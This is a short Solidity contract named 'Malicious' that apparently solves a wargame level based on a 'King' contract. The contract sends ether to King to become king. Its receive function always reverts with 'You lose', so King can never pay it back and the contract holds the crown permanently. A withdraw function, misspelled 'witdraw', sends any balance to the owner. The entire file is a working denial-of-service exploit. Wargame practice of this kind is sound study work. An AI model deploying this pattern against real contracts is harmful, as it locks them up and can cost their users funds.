// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Malicious {

  address private _owner;
  address private _king;
  King public king;

  constructor(address king_) {
    _owner = msg.sender;
    _king = king_;
    king = King(payable(king_));  
  }

  receive() external payable {
    revert("You lose");
  }

  function beKing() public payable {
    (bool sent,) = address(king).call{gas: 100000, value: msg.value}("");
  }

  function witdraw() public {
    payable(_owner).transfer(address(this).balance);
  }
}
